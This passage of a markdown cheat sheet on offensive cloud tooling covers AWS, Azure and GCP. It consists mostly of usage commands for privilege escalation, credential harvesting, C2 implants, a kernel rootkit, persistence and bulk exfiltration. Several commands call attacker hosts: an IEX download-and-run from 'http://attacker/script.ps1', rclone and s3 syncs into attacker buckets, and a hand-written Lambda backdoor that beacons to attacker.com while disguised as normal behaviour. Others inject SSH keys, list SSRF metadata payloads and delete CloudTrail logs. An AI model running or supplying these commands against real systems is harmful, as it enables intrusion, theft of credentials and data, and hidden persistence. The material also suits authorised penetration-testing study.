# Privilege escalation scanner
run iam__privesc_scan

# Backdoor user
run iam__backdoor_users_keys

# Exfiltrate data
run s3__download_bucket

# EC2 SSRF
run ec2__startup_shell_script

# Lambda backdoor
run lambda__backdoor_new_roles

# Steal secrets
run secrets__enum_secrets
```

### CloudBrute

**Description:** Cloud infrastructure reconnaissance tool for discovering cloud assets.

**Installation:**

```bash
git clone https://github.com/0xsha/CloudBrute.git
cd CloudBrute
pip3 install -r requirements.txt
```

**Basic Usage:**

```bash
# AWS S3 bucket enumeration
python3 CloudBrute.py -k -d target -w wordlist.txt -c aws

# Azure storage enumeration
python3 CloudBrute.py -k -d target -w wordlist.txt -c azure

# GCP storage enumeration
python3 CloudBrute.py -k -d target -w wordlist.txt -c gcp

# Digital Ocean spaces
python3 CloudBrute.py -k -d target -w wordlist.txt -c do

# Multi-cloud scan
python3 CloudBrute.py -k -d target -w wordlist.txt -c all

# Custom threads
python3 CloudBrute.py -k -d target -w wordlist.txt -c aws -t 50

# With verbosity
python3 CloudBrute.py -k -d target -w wordlist.txt -c aws -v
```

### S3Scanner

**Description:** Scans for open S3 buckets and dumps contents.

**Installation:**

```bash
git clone https://github.com/sa7mon/S3Scanner.git
cd S3Scanner
pip3 install -r requirements.txt
```

**Basic Usage:**

```bash
# Scan from list
python3 s3scanner.py --bucket-file buckets.txt

# Scan single bucket
python3 s3scanner.py --bucket example-bucket

# Dump bucket contents
python3 s3scanner.py --bucket example-bucket --dump

# Output to file
python3 s3scanner.py --bucket-file buckets.txt --out-file results.txt

# JSON output
python3 s3scanner.py --bucket-file buckets.txt --json

# Test for write access
python3 s3scanner.py --bucket example-bucket --write-test
```

### cloud_enum

**Description:** Multi-cloud OSINT tool for discovering cloud resources.

**Installation:**

```bash
git clone https://github.com/initstring/cloud_enum.git
cd cloud_enum
pip3 install -r requirements.txt
```

**Basic Usage:**

```bash
# Enumerate company infrastructure
python3 cloud_enum.py -k company-name

# Enumerate with custom wordlist
python3 cloud_enum.py -k company-name -w custom-wordlist.txt

# Disable specific cloud providers
python3 cloud_enum.py -k company-name --disable-azure

# Only check specific services
python3 cloud_enum.py -k company-name -m azurevm

# Verbose output
python3 cloud_enum.py -k company-name -v

# Output to file
python3 cloud_enum.py -k company-name -l results.txt

# Threads for speed
python3 cloud_enum.py -k company-name -t 25
```

### CloudFox

**Description:** AWS situational awareness tool for penetration testers.

**Installation:**

```bash
# Download latest release
wget https://github.com/BishopFox/cloudfox/releases/latest/download/cloudfox-linux-amd64
chmod +x cloudfox-linux-amd64
mv cloudfox-linux-amd64 /usr/local/bin/cloudfox

# Or build from source
git clone https://github.com/BishopFox/cloudfox.git
cd cloudfox
go build .
```

**Basic Usage:**

```bash
# All commands for AWS account
cloudfox aws all-checks -p <profile-name>

# Enumerate permissions
cloudfox aws permissions -p <profile-name>

# Find privilege escalation paths
cloudfox aws privesc -p <profile-name>

# Enumerate endpoints
cloudfox aws endpoints -p <profile-name>

# Find secrets
cloudfox aws secrets -p <profile-name>

# Enumerate IAM roles
cloudfox aws role-trusts -p <profile-name>

# Inventory resources
cloudfox aws inventory -p <profile-name>

# Find public resources
cloudfox aws resource-trusts -p <profile-name>

# EC2 instances
cloudfox aws instances -p <profile-name>

# Network topology
cloudfox aws network-ports -p <profile-name>
```

**Output Options:**

```bash
# Specific output directory
cloudfox aws all-checks -p <profile> -o /path/to/output

# Verbose mode
cloudfox aws all-checks -p <profile> -v

# Wrap table output
cloudfox aws all-checks -p <profile> --wrap
```

### Azucar

**Description:** Security auditing tool for Azure environments.

**Installation:**

```bash
git clone https://github.com/nccgroup/azucar.git
cd azucar
Import-Module .\Azucar.ps1  # PowerShell on Linux
```

**Basic Usage (PowerShell):**

```powershell
# Connect and scan
Get-Azucar -AuthMode UseCachedCredentials

# Specific subscription
Get-Azucar -SubscriptionId <subscription-id>

# Export to JSON
Get-Azucar -ExportTo JSON

# Export to CSV
Get-Azucar -ExportTo CSV

# Full scan with all checks
Get-Azucar -Verbose -AuthMode UseCachedCredentials
```

### GCPBucketBrute

**Description:** Enumerate GCP storage buckets.

**Installation:**

```bash
git clone https://github.com/RhinoSecurityLabs/GCPBucketBrute.git
cd GCPBucketBrute
pip3 install -r requirements.txt
```

**Basic Usage:**

```bash
# Brute force buckets
python3 gcpbucketbrute.py -k company-name

# Custom wordlist
python3 gcpbucketbrute.py -k company-name -w wordlist.txt

# Check for public access
python3 gcpbucketbrute.py -k company-name --check-open

# Output results
python3 gcpbucketbrute.py -k company-name -o results.txt
```

---

## Credential Harvesting Tools

### aws_consoler

**Description:** Converts AWS credentials into console sessions.

**Installation:**

```bash
pip3 install aws-consoler

# Or from source
git clone https://github.com/NetSPI/aws_consoler.git
cd aws_consoler
pip3 install -r requirements.txt
```

**Basic Usage:**

```bash
# Generate console URL from credentials
aws_consoler -a <access-key> -s <secret-key>

# With session token
aws_consoler -a <access-key> -s <secret-key> -t <session-token>

# From AWS CLI profile
aws_consoler -p <profile-name>

# Specify region
aws_consoler -a <access-key> -s <secret-key> -r us-west-2

# Output URL only
aws_consoler -a <access-key> -s <secret-key> --url-only
```

### aws-vault

**Description:** Secure credential storage and session management for AWS.

**Installation:**

```bash
# Kali/Debian
sudo apt install aws-vault

# Manual installation
wget https://github.com/99designs/aws-vault/releases/latest/download/aws-vault-linux-amd64
chmod +x aws-vault-linux-amd64
sudo mv aws-vault-linux-amd64 /usr/local/bin/aws-vault
```

**Basic Usage:**

```bash
# Add credentials
aws-vault add <profile-name>

# List stored credentials
aws-vault list

# Execute command with credentials
aws-vault exec <profile-name> -- aws s3 ls

# Start shell session
aws-vault exec <profile-name> -- bash

# Export credentials as environment variables
aws-vault exec <profile-name> --no-session -- env | grep AWS

# Rotate credentials
aws-vault rotate <profile-name>

# Remove credentials
aws-vault remove <profile-name>
```

### WeirdAAL

**Description:** AWS attack library for credential abuse and privilege escalation.

**Installation:**

```bash
git clone https://github.com/carnal0wnage/weirdAAL.git
cd weirdAAL
pip3 install -r requirements.txt
python3 weirdAAL.py -h
```

**Basic Usage:**

```bash
# List available modules
python3 weirdAAL.py -l

# Recon modules
python3 weirdAAL.py -m recon_all -t <profile-name>

# Enumerate permissions
python3 weirdAAL.py -m enumerate_iam -t <profile-name>

# Find secrets in code
python3 weirdAAL.py -m secrets_from_repos -t <profile-name>

# Persistence modules
python3 weirdAAL.py -m create_backdoor_user -t <profile-name>

# Data exfiltration
python3 weirdAAL.py -m download_all_s3 -t <profile-name>
```

### cloud-service-enum

**Description:** Enumerates cloud services and extracts metadata.

**Installation:**

```bash
git clone https://github.com/NotSoSecure/cloud-service-enum.git
cd cloud-service-enum
pip3 install -r requirements.txt
```

**Basic Usage:**

```bash
# AWS metadata service
python3 cloud-service-enum.py aws-metadata

# Azure metadata
python3 cloud-service-enum.py azure-metadata

# GCP metadata
python3 cloud-service-enum.py gcp-metadata

# Extract IAM credentials
python3 cloud-service-enum.py aws-metadata --iam-creds

# Save output
python3 cloud-service-enum.py aws-metadata -o output.txt
```

### SkyArk

**Description:** Azure security scanning and privilege escalation discovery.

**Installation:**

```bash
git clone https://github.com/cyberark/SkyArk.git
cd SkyArk/AzureStealth
Import-Module .\AzureStealth.ps1  # PowerShell
```

**Basic Usage (PowerShell):**

```powershell
# Scan Azure AD for shadow admins
Scan-AzureAdmins

# Full Azure security scan
Scan-AzureStealth

# Check specific subscription
Scan-AzureStealth -SubscriptionId <id>

# Export results
Scan-AzureStealth -ExportCSV
```

### GCPwn

**Description:** GCP penetration testing and exploitation toolkit.

**Installation:**

```bash
git clone https://github.com/NetSPI/gcpwn.git
cd gcpwn
pip3 install -r requirements.txt
```

**Basic Usage:**

```bash
# Enumerate GCP resources
python3 gcpwn.py enum --project-id <project-id>

# Find privilege escalation paths
python3 gcpwn.py privesc --project-id <project-id>

# Extract credentials
python3 gcpwn.py creds --project-id <project-id>

# Backdoor service account
python3 gcpwn.py backdoor --project-id <project-id>
```

### ROADtools

**Description:** Azure AD reconnaissance and attack toolkit.

**Installation:**

```bash
pip3 install roadrecon roadlib roadtx
```

**Basic Usage:**

```bash
# Authenticate
roadrecon auth --username user@domain.com --password password

# Gather data from Azure AD
roadrecon gather

# Start web interface
roadrecon gui

# Export data
roadrecon dump

# Specific queries
roadrecon plugin policies
roadrecon plugin devices
```

**ROADtx (Token manipulation):**

```bash
# Get access token
roadtx gettokens --username user@domain.com --password password

# Refresh token
roadtx refreshtoken -r <refresh-token>

# Device code flow
roadtx gettoken --device-code

# List obtained tokens
roadtx listtokens
```

### Bucket Stream

**Description:** Real-time S3 bucket discovery via certificate transparency logs.

**Installation:**

```bash
git clone https://github.com/eth0izzle/bucket-stream.git
cd bucket-stream
pip3 install -r requirements.txt
```

**Basic Usage:**

```bash
# Start monitoring
python3 bucket-stream.py

# With specific keywords
python3 bucket-stream.py --keywords company,target,prod

# Check for public access
python3 bucket-stream.py --check-access

# Output to file
python3 bucket-stream.py -o buckets.log

# Multi-threaded
python3 bucket-stream.py -t 50
```

### truffleHog

**Description:** Searches for secrets in git repositories (including cloud credentials).

**Installation:**

```bash
# Install via pip
pip3 install trufflehog

# Or from source
git clone https://github.com/trufflesecurity/trufflehog.git
cd trufflehog
go install
```

**Basic Usage:**

```bash
# Scan git repository
trufflehog git https://github.com/target/repo

# Scan local directory
trufflehog filesystem /path/to/code

# S3 bucket scanning
trufflehog s3 --bucket=<bucket-name>

# Docker image scanning
trufflehog docker --image=<image:tag>

# Only verified secrets
trufflehog git https://github.com/target/repo --only-verified

# JSON output
trufflehog git https://github.com/target/repo --json

# Scan specific branch
trufflehog git https://github.com/target/repo --branch=main
```

---

## Exploitation Frameworks

### Pacu (Detailed Exploitation Modules)

**AWS Service Exploitation:**

```bash
# EC2 exploitation
run ec2__download_userdata           # Extract user data
run ec2__startup_shell_script        # Add malicious startup script
run ec2__check_termination_protection
run ec2__snapshot_search             # Search snapshots for secrets

# IAM exploitation
run iam__backdoor_users_keys         # Create backdoor users
run iam__backdoor_users_password     # Set backdoor password
run iam__backdoor_assume_role        # Backdoor role trust policy
run iam__privesc_scan                # Privilege escalation paths
run iam__detect_honeytokens          # Detect honeypot credentials

# Lambda exploitation
run lambda__backdoor_new_roles       # Backdoor Lambda execution roles
run lambda__backdoor_new_users       # Backdoor via Lambda
run lambda__enum_code                # Download Lambda code

# S3 exploitation
run s3__download_bucket              # Exfiltrate bucket
run s3__bucket_finder                # Find misconfigured buckets
run s3__ransomware                   # Encrypt bucket contents [Unverified - included for awareness]

# RDS exploitation
run rds__explore_snapshots           # Access RDS snapshots
run rds__enum_snapshots              # Enumerate snapshot permissions

# Secrets Manager
run secrets__enum_secrets            # Extract all secrets
run secrets__dump_secrets            # Download secret values

# Systems Manager
run systemsmanager__rce_ec2          # Remote code execution via SSM
run systemsmanager__download_parameters  # Extract parameters

# CloudFormation
run cloudformation__download_templates  # Extract templates (may contain secrets)

# CodeBuild
run codebuild__enum                  # Enumerate build projects
run codebuild__extract_secrets       # Extract secrets from builds
```

**Advanced Pacu Workflows:**

```bash
# Full reconnaissance
run aws__enum_all
data

# Permission analysis
run iam__enum_permissions
run iam__bruteforce_permissions

# Privilege escalation
run iam__privesc_scan
services IAM

# Lateral movement
run iam__backdoor_assume_role
run lambda__backdoor_new_roles

# Data exfiltration
run s3__download_bucket --bucket-name target-bucket
run rds__explore_snapshots
run secrets__dump_secrets

# Persistence
run iam__backdoor_users_keys --username backdoor-admin
run lambda__backdoor_new_users

# Clean up artifacts
run aws__delete_cloudtrail_logs  # [Unverified - check documentation]
```

### Rhino Security Labs Modules

**CloudGoat** - Intentionally vulnerable AWS infrastructure for practice.

**Installation:**

```bash
git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
cd cloudgoat
pip3 install -r requirements.txt
chmod +x cloudgoat.py
```

**Basic Usage:**

```bash
# Configure CloudGoat
./cloudgoat.py config profile
./cloudgoat.py config whitelist --auto

# List scenarios
./cloudgoat.py list scenarios

# Create scenario
./cloudgoat.py create iam_privesc_by_rollback

# Get scenario details
./cloudgoat.py scenario_help iam_privesc_by_rollback

# Destroy scenario
./cloudgoat.py destroy iam_privesc_by_rollback

# List all deployed scenarios
./cloudgoat.py list deployed
```

**Available Scenarios (Examples):**

- `iam_privesc_by_rollback` - IAM privilege escalation
- `lambda_privesc` - Lambda privilege escalation
- `cloud_breach_s3` - S3 security issues
- `ec2_ssrf` - EC2 SSRF exploitation
- `codebuild_secrets` - Secret exposure in CodeBuild
- `rce_web_app` - RCE in web applications

### Metasploit Cloud Modules

**Installation (Kali includes Metasploit):**

```bash
msfconsole
```

**AWS Modules:**

```bash
# Search for cloud modules
search cloud
search aws
search azure
search gcp

# AWS S3 enumeration
use auxiliary/cloud/aws/enum_s3
set ACCESS_KEY_ID <key>
set SECRET_ACCESS_KEY <secret>
run

# AWS EC2 enumeration
use auxiliary/cloud/aws/enum_ec2
set ACCESS_KEY_ID <key>
set SECRET_ACCESS_KEY <secret>
run

# AWS IAM enumeration
use auxiliary/cloud/aws/enum_iam
set ACCESS_KEY_ID <key>
set SECRET_ACCESS_KEY <secret>
run

# Azure enumeration
use auxiliary/cloud/azure/management/enum_subscriptions
set CLIENT_ID <id>
set CLIENT_SECRET <secret>
set TENANT_ID <tenant>
run
```

### Nimbostratus

**Description:** Tools for fingerprinting and exploiting AWS infrastructure.

**Installation:**

```bash
git clone https://github.com/andresriancho/nimbostratus.git
cd nimbostratus
pip install -r requirements.txt
python setup.py install
```

**Basic Usage:**

```bash
# Dump EC2 metadata
nimbostratus dump-metadata

# Enumerate IAM permissions
nimbostratus enumerate-iam

# Create backdoor
nimbostratus create-backdoor

# Dump DynamoDB
nimbostratus dump-dynamodb --table-name <table>

# Exploit SSRF
nimbostratus exploit-ssrf --target http://target.com
```

### Endgame AWS Privilege Escalation

**Description:** Tool for demonstrating AWS IAM privilege escalation methods.

**Installation:**

```bash
pip3 install endgame

# Or from source
git clone https://github.com/salesforce/endgame.git
cd endgame
pip3 install -e .
```

**Basic Usage:**

```bash
# List exposure types
endgame list-resources --service all

# Expose resource
endgame expose --service s3 --name my-bucket

# Smash (expose everything)
endgame smash --service all --evil-principal arn:aws:iam::999988887777:root

# List findings
endgame list-resources --service all --list-findings
```

**Service-Specific:**

```bash
# S3 exposure
endgame expose --service s3 --name target-bucket

# Lambda exposure
endgame expose --service lambda --name function-name

# Secrets Manager exposure
endgame expose --service secretsmanager --name secret-name

# SQS exposure
endgame expose --service sqs --name queue-name

# SNS exposure
endgame expose --service sns --name topic-name
```

### CloudSploit

**Description:** Cloud security configuration scanner (AWS, Azure, GCP, Oracle).

**Installation:**

```bash
git clone https://github.com/aquasecurity/cloudsploit.git
cd cloudsploit
npm install
```

**Basic Usage:**

```bash
# AWS scan
node index.js --cloud aws --config ./config.js

# Azure scan
node index.js --cloud azure --config ./config.js

# GCP scan
node index.js --cloud gcp --config ./config.js

# Specific compliance
node index.js --cloud aws --compliance hipaa

# JSON output
node index.js --cloud aws --json results.json

# CSV output
node index.js --cloud aws --csv results.csv
```

---

## Post-Exploitation Tools

### aws-pwn

**Description:** Collection of AWS post-exploitation scripts.

**Installation:**

```bash
git clone https://github.com/dagrz/aws_pwn.git
cd aws_pwn
pip3 install -r requirements.txt
```

**Basic Usage:**

```bash
# Persistence via IAM user
python3 persistence/create_admin_user.py

# Backdoor Lambda function
python3 persistence/backdoor_lambda.py --function-name <name>

# Exfiltrate RDS snapshot
python3 exfil/rds_snapshot_exfil.py --snapshot-id <id>

# Golden SAML
python3 persistence/golden_saml.py
```

### Diamorphine (Kernel Rootkit - Linux EC2)

**Description:** LKM rootkit for hiding processes and files on compromised Linux instances.

**Installation:**

```bash
git clone https://github.com/m0nad/Diamorphine.git
cd Diamorphine
make

# Load module
insmod diamorphine.ko
```

**Basic Usage:**

```bash
# Hide/unhide module
kill -63 0

# Give root privileges
kill -64 <pid>

# Hide process
kill -31 <pid>

# Unhide process
kill -63 <pid>
```

[Unverified] Effectiveness depends on kernel version and may be detected by modern EDR solutions.

### Merlin (C2 Framework)

**Description:** Cross-platform post-exploitation C2 server written in Go.

**Installation:**

```bash
# Download latest release
wget https://github.com/Ne0nd0g/merlin/releases/latest/download/merlinServer-Linux-x64.7z
7z x merlinServer-Linux-x64.7z
cd merlinServer-Linux-x64

# Or build from source
git clone https://github.com/Ne0nd0g/merlin.git
cd merlin/cmd/merlinServer
go build -o merlin main.go
```

**Basic Usage:**

```bash
# Start Merlin server
./merlinServer-Linux-x64

# Generate agent
Merlin» use module payload/windows/x64/go/merlin
Merlin» set LHOST 0.0.0.0
Merlin» set LPORT 443
Merlin» run

# Deploy to cloud instance
# Transfer agent to compromised EC2/Azure VM/GCP instance
# Execute agent for callback

# Agent commands
agent <agent-id>» shell whoami
agent <agent-id>» download /etc/passwd
agent <agent-id>» upload tool.sh /tmp/tool.sh
```

### Empire/Starkiller (PowerShell C2)

**Installation:**

```bash
# Install Empire
git clone https://github.com/BC-SECURITY/Empire.git
cd Empire
./setup/install.sh

# Run Empire
./ps-empire server
./ps-empire client

# Install Starkiller (GUI)
wget https://github.com/BC-SECURITY/Starkiller/releases/latest/download/starkiller-linux-x64
chmod +x starkiller-linux-x64
./starkiller-linux-x64
```

**Basic Usage:**

```bash
# Create listener
(Empire) > listeners
(Empire: listeners) > uselistener http
(Empire: listeners/http) > set Host http://<attacker-ip>
(Empire: listeners/http) > execute

# Generate stager
(Empire) > usestager windows/launcher_bat
(Empire: stager/windows/launcher_bat) > set Listener http
(Empire: stager/windows/launcher_bat) > execute

# Deploy to Windows EC2 instance via user data or SSM

# Interact with agent
(Empire) > agents
(Empire) > interact <agent-name>
(Empire: <agent-name>) > shell whoami
```

**Cloud-Specific Modules:**

```bash
# AWS credential harvesting
(Empire: <agent-name>) > usemodule credentials/aws_keys
(Empire: <agent-name>) > execute

# Azure credential harvesting
(Empire: <agent-name>) > usemodule credentials/azure_tokens
(Empire: <agent-name>) > execute

# Mimikatz for cloud creds
(Empire: <agent-name>) > usemodule credentials/mimikatz/command
```

### Sliver C2

**Description:** Modern cross-platform adversary emulation/red team framework with cloud-native capabilities.

**Installation:**

```bash
# Download and install
curl https://sliver.sh/install|sudo bash

# Or manual installation
wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux
chmod +x sliver-server_linux
sudo mv sliver-server_linux /usr/local/bin/sliver-server

# Start server
sliver-server
```

**Basic Usage:**

```bash
# Generate implant for Linux (EC2/GCP/Azure VM)
sliver > generate --http <attacker-ip> --os linux --arch amd64 --save /tmp/

# Generate for Windows
sliver > generate --http <attacker-ip> --os windows --arch amd64 --save /tmp/

# Start HTTP listener
sliver > http --lport 443

# List active sessions
sliver > sessions

# Interact with session
sliver > use <session-id>

# Execute commands
sliver (session) > shell
sliver (session) > download /etc/passwd
sliver (session) > upload tool.bin /tmp/tool.bin
sliver (session) > execute -o whoami

# Port forwarding (access internal services)
sliver (session) > portfwd add --bind 127.0.0.1:8080 --remote 10.0.1.50:80

# SOCKS proxy
sliver (session) > socks5 start

# Pivoting
sliver (session) > pivots
```

**Cloud-Specific Operations:**

```bash
# Execute AWS CLI commands (if installed on target)
sliver (session) > shell
shell > aws s3 ls
shell > aws iam get-user
shell > curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Download cloud credentials
sliver (session) > download /home/ubuntu/.aws/credentials
sliver (session) > download /root/.azure/credentials
sliver (session) > download /root/.config/gcloud/

# Process injection (evade detection)
sliver (session) > psexec -p <pid>
```

### Mythic C2

**Description:** Collaborative multi-platform C2 framework with containerized agents.

**Installation:**

```bash
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic

# Install using docker
sudo ./install_docker_ubuntu.sh
sudo make

# Start Mythic
sudo ./mythic-cli start

# Access at https://127.0.0.1:7443
# Default credentials: mythic_admin / randomly generated (check logs)
```

**Basic Usage:**

```bash
# Install agents (via web UI or CLI)
sudo ./mythic-cli install github https://github.com/MythicAgents/poseidon

# Generate payload (via web UI)
# Payloads > Create > Select agent > Configure > Build

# Deploy to cloud instance
# Transfer payload to EC2/Azure VM/GCP instance

# C2 operations via web interface:
# - Active Callbacks: View active agents
# - Task: Execute commands
# - File Browser: Navigate file system
# - Process Browser: View/inject processes
# - SOCKS: Create SOCKS proxy
```

**Cloud Credential Harvesting:**

```bash
# Via task commands in Mythic web UI
download /home/ubuntu/.aws/credentials
download /root/.azure/credentials
shell cat /home/ubuntu/.aws/config
shell curl http://169.254.169.254/latest/meta-data/
```

### DogStrike

**Description:** Automated AWS post-exploitation tool.

**Installation:**

```bash
git clone https://github.com/SygniaLabs/DogStrike.git
cd DogStrike
pip3 install -r requirements.txt
```

**Basic Usage:**

```bash
# Run automated exploitation
python3 dogstrike.py --profile <aws-profile>

# Specific targets
python3 dogstrike.py --profile <aws-profile> --target ec2

# Enable specific modules
python3 dogstrike.py --profile <aws-profile> --modules persistence,exfil

# Output results
python3 dogstrike.py --profile <aws-profile> -o results.json
```

### NetSPI AWS Post-Exploitation Modules

**AWS Pwn** - Collection of post-exploitation scripts.

**Installation:**

```bash
git clone https://github.com/NetSPI/aws_pwn.git
cd aws_pwn
pip3 install -r requirements.txt
```

**Key Scripts:**

```bash
# Lambda backdoor
python3 lambda_backdoor.py --function-name <name> --payload reverse_shell.py

# S3 data exfiltration with encryption
python3 s3_exfil.py --bucket <bucket-name> --encrypt

# RDS snapshot creation and sharing
python3 rds_snapshot_share.py --instance <instance-id> --target-account <account-id>

# IAM credential harvest from EC2
python3 ec2_iam_harvest.py --instance-id <id>

# Secrets Manager dump
python3 secrets_dump.py --region <region>

# CloudFormation stack enumeration
python3 cfn_enum.py --region <region>
```

### ImpacketRelayX (SMB Relaying in Cloud)

**Description:** SMB relay attacks for Windows instances in cloud environments.

**Installation (included in Kali):**

```bash
# Verify installation
impacket-ntlmrelayx -h

# Or install from source
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket
pip3 install .
```

**Basic Usage:**

```bash
# SMB relay to cloud Windows instance
impacket-ntlmrelayx -t <target-ip> -smb2support

# With SOCKS proxy
impacket-ntlmrelayx -t <target-ip> -socks -smb2support

# Dump SAM
impacket-ntlmrelayx -t <target-ip> -c "reg save HKLM\SAM C:\temp\sam"

# Execute commands
impacket-ntlmrelayx -t <target-ip> -c "whoami"

# Dump credentials via secretsdump
impacket-ntlmrelayx -t <target-ip> -e /tmp/loot
```

**Cloud-Specific Scenarios:**

```bash
# Relay within VPC
impacket-ntlmrelayx -tf targets.txt -smb2support -socks

# After compromise, use SOCKS for lateral movement
# Configure proxychains
nano /etc/proxychains4.conf
# Add: socks4 127.0.0.1 1080

# Access internal resources
proxychains impacket-wmiexec domain/user:pass@internal-ip
```

### Cloud Metadata Exploitation Tools

#### PACU's EC2 Module Extensions

```bash
# Comprehensive metadata extraction
run ec2__enum_instances_metadata

# Automated credential harvest from metadata
run ec2__metadata_credential_harvest

# User data extraction
run ec2__download_userdata

# Check for SSM agent
run ec2__check_ssm_agent
```

#### AWS IMDSv2 Bypass Techniques

**Installation of custom tool:**

```bash
git clone https://github.com/RhinoSecurityLabs/Security-Research.git
cd Security-Research/tools/aws-pentest-tools
```

**IMDSv1 to IMDSv2 testing:**

```bash
# Test IMDSv1 (if enabled)
curl http://169.254.169.254/latest/meta-data/

# IMDSv2 token request
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
    -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Use token for requests
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Extract role credentials
ROLE=$(curl -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/)

curl -H "X-aws-ec2-metadata-token: $TOKEN" \
    http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
```

**SSRF exploitation for metadata:**

```bash
# Through web application SSRF
http://vulnerable-app.com/proxy?url=http://169.254.169.254/latest/meta-data/

# URL encoding if filtered
http://vulnerable-app.com/proxy?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F

# Alternative encoding
http://vulnerable-app.com/proxy?url=http://0x7f000001/latest/meta-data/

# DNS rebinding (if applicable)
http://vulnerable-app.com/proxy?url=http://metadata.attacker.com/
```

### Lateral Movement Tools

#### SSM Session Manager Abuse

```bash
# List available instances with SSM
aws ssm describe-instance-information

# Start session
aws ssm start-session --target <instance-id>

# Execute commands via SSM
aws ssm send-command \
    --document-name "AWS-RunShellScript" \
    --instance-ids "<instance-id>" \
    --parameters 'commands=["whoami","hostname"]'

# Retrieve command output
aws ssm list-command-invocations \
    --command-id <command-id> \
    --details

# Port forwarding via SSM
aws ssm start-session \
    --target <instance-id> \
    --document-name AWS-StartPortForwardingSession \
    --parameters '{"portNumber":["3389"],"localPortNumber":["13389"]}'
```

#### PsExec for Windows Instances

```bash
# Impacket psexec
impacket-psexec administrator:password@<target-ip>

# With hash (pass-the-hash)
impacket-psexec -hashes :<ntlm-hash> administrator@<target-ip>

# WMI execution
impacket-wmiexec administrator:password@<target-ip>

# Remote PowerShell
impacket-wmiexec administrator:password@<target-ip> "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"
```

#### SSH Key Harvesting and Injection

```bash
# Extract SSH keys from compromised instance
find / -name "id_rsa" 2>/dev/null
find / -name "id_ecdsa" 2>/dev/null
find / -name "id_ed25519" 2>/dev/null

# Copy authorized_keys
cat /home/*/.ssh/authorized_keys
cat /root/.ssh/authorized_keys

# Inject attacker SSH key
echo "ssh-rsa AAAA..." >> /home/ubuntu/.ssh/authorized_keys
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Modify SSH config for persistence
echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
systemctl restart sshd
```

### Data Exfiltration Tools

#### Rclone (Cloud-to-Cloud Transfer)

**Installation:**

```bash
curl https://rclone.org/install.sh | sudo bash

# Or via apt
sudo apt install rclone
```

**Basic Usage:**

```bash
# Configure source (AWS S3)
rclone config

# Quick setup with credentials
rclone config create source s3 \
    provider=AWS \
    access_key_id=<key> \
    secret_access_key=<secret>

# Configure destination (attacker-controlled)
rclone config create dest s3 \
    provider=AWS \
    access_key_id=<attacker-key> \
    secret_access_key=<attacker-secret>

# Copy data
rclone copy source:bucket-name dest:exfil-bucket

# Sync data
rclone sync source:bucket-name dest:exfil-bucket

# Mount remote bucket
rclone mount source:bucket-name /mnt/s3 &

# Bandwidth limiting (stealth)
rclone copy source:bucket-name dest:exfil-bucket --bwlimit 1M

# Background operation
rclone copy source:bucket-name dest:exfil-bucket --log-file=/tmp/rclone.log &
```

**Advanced Options:**

```bash
# Encrypt during transfer
rclone copy source:bucket dest:exfil --crypt-remote=encrypted:

# Multi-threaded transfer
rclone copy source:bucket dest:exfil --transfers=10

# Only specific file types
rclone copy source:bucket dest:exfil --include "*.{docx,xlsx,pdf}"

# Exclude specific patterns
rclone copy source:bucket dest:exfil --exclude "*.log"

# Transfer with size limit
rclone copy source:bucket dest:exfil --max-size 100M
```

#### S3Scanner for Bulk Downloads

```bash
# Download all accessible buckets from list
python3 s3scanner.py --bucket-file accessible_buckets.txt --dump --threads 10

# Download to specific directory
python3 s3scanner.py --bucket target-bucket --dump --output-dir /tmp/exfil/

# Selective download by extension
python3 s3scanner.py --bucket target-bucket --dump --include-pattern "*.pdf"
```

#### AWS S3 Sync (Native Tool)

```bash
# Exfiltrate entire bucket
aws s3 sync s3://target-bucket /tmp/exfil/

# With bandwidth limiting (tc required)
# First, limit network interface
sudo tc qdisc add dev eth0 root tbf rate 1mbit burst 32kbit latency 400ms
aws s3 sync s3://target-bucket /tmp/exfil/
sudo tc qdisc del dev eth0 root

# Parallel downloads
aws s3 sync s3://target-bucket /tmp/exfil/ --max-concurrent-requests 20

# Selective sync
aws s3 sync s3://target-bucket /tmp/exfil/ --exclude "*" --include "*.docx"

# To attacker-controlled bucket
aws s3 sync s3://target-bucket s3://attacker-bucket --profile attacker
```

#### DynamoDB Data Exfiltration

```bash
# Scan entire table
aws dynamodb scan --table-name <table-name> > table_data.json

# Paginated scan for large tables
aws dynamodb scan --table-name <table-name> \
    --max-items 1000 \
    --starting-token <token> > page1.json

# Export to S3 (requires permissions)
aws dynamodb export-table-to-point-in-time \
    --table-arn <table-arn> \
    --s3-bucket <bucket-name> \
    --s3-prefix exports/

# Convert to CSV
jq -r '.Items[] | [.attribute1.S, .attribute2.N] | @csv' table_data.json > data.csv
```

### Persistence Tools

#### Lambda Backdoor Persistence

**Installation:**

```bash
git clone https://github.com/Voulnet/barq-aws-attack-tool.git
cd barq-aws-attack-tool
pip3 install -r requirements.txt
```

**Basic Usage:**

```bash
# Create backdoor Lambda
python3 barq.py lambda-backdoor \
    --function-name legitimate-function \
    --payload-url http://attacker.com/payload.py

# Create event-triggered backdoor
python3 barq.py lambda-event-backdoor \
    --event-source s3 \
    --bucket target-bucket
```

**Manual Lambda Backdoor:**

```bash
# Create malicious Lambda function
cat > backdoor.py << 'EOF'
import json
import boto3
import urllib.request

def lambda_handler(event, context):
    # Beacon to attacker
    urllib.request.urlopen('http://attacker.com/beacon?host=' + context.function_name)
    
    # Original functionality (to avoid detection)
    return {
        'statusCode': 200,
        'body': json.dumps('Success')
    }
EOF

# Package function
zip backdoor.zip backdoor.py

# Create or update Lambda
aws lambda create-function \
    --function-name backdoor-function \
    --runtime python3.9 \
    --role <role-arn> \
    --handler backdoor.lambda_handler \
    --zip-file fileb://backdoor.zip

# Add trigger (e.g., API Gateway, S3, CloudWatch Events)
aws lambda add-permission \
    --function-name backdoor-function \
    --statement-id AllowAPIGatewayInvoke \
    --action lambda:InvokeFunction \
    --principal apigateway.amazonaws.com
```

